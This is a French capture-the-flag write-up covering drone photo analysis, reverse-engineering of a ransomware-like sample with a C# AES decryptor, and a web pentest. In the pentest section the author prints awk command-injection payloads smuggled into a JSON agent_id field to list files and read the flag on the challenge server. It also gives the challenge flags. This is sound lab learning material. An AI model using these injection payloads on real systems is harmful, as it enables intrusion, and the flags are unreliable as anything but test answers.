# **CTF - ⚓️ COMCYBER X MARINE 03/03/2025 By Zapz**
&nbsp;
&nbsp;
&nbsp;
&nbsp;
## __01 - Analyse 🔍__

Dans cette première partie du CTF, nous avons analysé 4 images prises par un drone pour découvrir son numéro de série.

&nbsp;

### **Méthodologie 📋**

- 🖼️ **Analyse des 4 images** du drone

- 🔢 **Identification des chiffres** visibles sur les différentes parties de l'appareil

- 💭 **Hypothèse** : les photos proviennent d'un appareil photo militaire doté de fonctionnalités de reconnaissance

- 📱 L'appareil photo semble capable d'**identifier et d'afficher automatiquement** les inscriptions sur le drone

&nbsp;

### **Résolution 🛠️**
 
Les chiffres repérés correspondent aux **numéros de série** situés sur les différentes faces du drone. Le principal défi était de déterminer leur ordre correct.

**Approche systématique** :
- 🔄 Vérification de toutes les combinaisons possibles

&nbsp;

---
&nbsp;
## __02 - Forensic / Reverse 🔬__

Cette deuxième partie du CTF consistait à effectuer une analyse de rétro-ingénierie d'un malware pour comprendre son fonctionnement.

&nbsp;

### **Analyse initiale du code 📝**

Le code source révèle plusieurs éléments importants :

- 🔐 Présence de fonctions de **chiffrement utilisant AES**

- 🔑 Utilisation de **clés composites** (ComputeCompositeKey)

- 📁 **Parcours récursif** des répertoires (fonction hh)

- 🌐 Communication avec un **serveur C2** (PostToC2)

- 🔒 Présence de chaînes encodées en **Base64**

&nbsp;

### **Fonctionnalités principales identifiées 🎯**

Le malware présente les caractéristiques suivantes :

- ✅ **Chiffrement de fichiers** avec extension .enc

- ✅ Création de **fichiers temporaires** pendant le processus

- ✅ Système d'**authentification** avec nom d'utilisateur/mot de passe

- ✅ Mécanisme de **communication** avec un serveur de commande et contrôle

&nbsp;

> **Le malware semble être conçu pour le chiffrement de fichiers avec des capacités de communication distante, suggérant un possible ransomware.**

&nbsp;

### **Analyse des chaînes encodées 🔍**

En analysant le code source du malware, j'ai identifié plusieurs chaînes importantes encodées en Base64 :

```
OF/sfn87WwjfIX14p17jp8mu5uavNFecb4D97pgVfZc=
3Npd3p5V7JSh6JZ5gqRmZg==
IeLkqcSXkaE8QamE7i4DEY3N7NmqJvAl1fzI7gIQkbo=
Wil860ds3vJiRDi+iTntnfknYML8iTowJsQe0uwmTms=
```

&nbsp;

### **Structure du code malveillant 🔧**

Ces chaînes représentent des **flags potentiels**, chacune stockée dans une variable spécifique (`flagL`, `flagO`, `flagN`, `flagNBN`). Le système utilise un déchiffrement AES avec des clés et vecteurs d'initialisation définis dans les fonctions `G()` et `H()`.

&nbsp;

### **Développement de la solution 💻**

Pour décrypter ces chaînes, j'ai développé un programme C# reproduisant la logique de déchiffrement du malware :

&nbsp;

```csharp
using System;
using System.IO;
using System.Security.Cryptography;
using System.Text;
using System.Threading.Tasks;

namespace X
{
    internal class Y
    {
        public static async Task Main(string[] p)
        {
            await MainAsync(p);
        }

        private static async Task MainAsync(string[] p)
        {
            RunCTF();
            await Task.Delay(1000);
        }

        private static string G() => "AA$F2-D8C1E7B9F3A35@C8@!BB2E1F0A7C3D";
        private static string H() => "D1@E2#F3%A4B5&C6D1@E2#F3%A4B5&C6D1@E2#F3%A4B5&C6";

        private static string DecryptBase64String(string base64Data)
        {
            byte[] key = Encoding.ASCII.GetBytes(G().Substring(0, 16));
            byte[] iv = Encoding.ASCII.GetBytes(H().Substring(0, 16));
            return M(Convert.FromBase64String(base64Data), key, iv);
        }

        private static string M(byte[] d, byte[] k, byte[] i)
        {
            using Aes aes = Aes.Create();
            aes.Key = k;
            aes.IV = i;
            using MemoryStream memoryStream = new(d);
            using CryptoStream cryptoStream = new(memoryStream, aes.CreateDecryptor(), CryptoStreamMode.Read);
            using StreamReader streamReader = new(cryptoStream);
            return streamReader.ReadToEnd();
        }

        public static void RunCTF()
        {
            string flagL = DecryptBase64String("OF/sfn87WwjfIX14p17jp8mu5uavNFecb4D97pgVfZc=");
            string flagO = DecryptBase64String("3Npd3p5V7JSh6JZ5gqRmZg==");
            string flagN = DecryptBase64String("IeLkqcSXkaE8QamE7i4DEY3N7NmqJvAl1fzI7gIQkbo=");
            string flagNBN = DecryptBase64String("Wil860ds3vJiRDi+iTntnfknYML8iTowJsQe0uwmTms=");
            Console.WriteLine("Flag L: " + flagL);
            Console.WriteLine("Flag O: " + flagO);
            Console.WriteLine("Flag N: " + flagN);
            Console.WriteLine("Flag NBN: " + flagNBN);
        }
    }
}
```

&nbsp;

### **Résultat obtenu ✅**

L'exécution du programme a révélé que le flag pour le challenge 02 est **"RM{zd7aWBS98uRprCoLjqhKkx}"**. Cette valeur était stockée dans la variable `flagNBN` et a été déchiffrée grâce à l'algorithme AES utilisant les clés des fonctions G() et H().

&nbsp;

---
&nbsp;
## __03 - Pentest Web 🌐__

La troisième partie du CTF portait sur la sécurité web, utilisant les informations découvertes lors de l'analyse du malware.

&nbsp;

### **Informations initiales 📋**

Les éléments de départ incluaient :

- 🔍 L'adresse IP du **serveur C2** extraite du malware

- 🔑 Les **identifiants** (user/password) récupérés lors de la rétro-ingénierie

- 🎯 Objectif : trouver la **clé dynamique** de déchiffrement sur le serveur

&nbsp;

### **Reconnaissance 🔍**

Première étape : scan des ports avec **nmap** pour identifier les services accessibles.

- 🌐 Découverte d'un service web sur le **port 5000**

- 🔒 Interface de connexion identifiée

- ✅ Accès réussi avec le login précédemment découverts

&nbsp;

### **Analyse des requêtes HTTP 🕵️**

L'inspection des requêtes réseau a révélé un endpoint API intéressant :

```http
POST /api/refresh HTTP/1.1
Host: 163.172.66.233:5000
Content-Type: application/json
Cookie: session=eyJsb2dnZWRfaW4iOnRydWUsInVzZXJuYW1lIjoiYWRtaW4ifQ.Z83rhw.oV39TINmA0z0DJSwttbnv-ejosU

{"agent_id":"1"}
```

Points clés identifiés :

- 📡 Endpoint **/api/refresh** acceptant des requêtes POST

- 🔑 **Cookie de session** présent dans l'en-tête

- 📝 Payload JSON simple avec un paramètre **agent_id**

- 🔄 Le paramètre agent_id varie selon le statut de l'agent (idle/online)

&nbsp;

### **Test d'injection de commandes 🔌**

J'ai commencé à tester différentes modifications du paramètre agent_id, notamment en essayant d'**injecter des commandes bash**. Les premières tentatives ont généré des erreurs awk indiquant une syntaxe incorrecte.

Après plusieurs ajustements de la syntaxe pour éliminer les erreurs, j'ai réussi à construire une **payload fonctionnelle** en lisant la doc awk :

```json
{
"agent_id": "2\") system(\"ls\") } #"
}
```

La réponse du serveur a révélé le contenu du répertoire :

```bash
app.py
flag_3.txt
mise.toml
requirements.txt
static
```

Cette réponse a confirmé la possibilité d'**exploiter la requete** pour exécuter des commandes système sur le serveur.

&nbsp;

### **Extraction du flag 🚩**

À l'aide d'une commande cat ciblée sur le fichier flag_3.txt, j'ai pu extraire le flag :

```json
{"agent_id": "2\") system(\"cat flag_3.txt\") } #"}
```

La réponse du serveur a révélé le flag : **RM{dfbc2fb4c76b315aa6fa06e5f35aef23b1da32f5}**

Cette exploitation réussie de l'injection de commandes a permis de compléter le challenge de pentest web.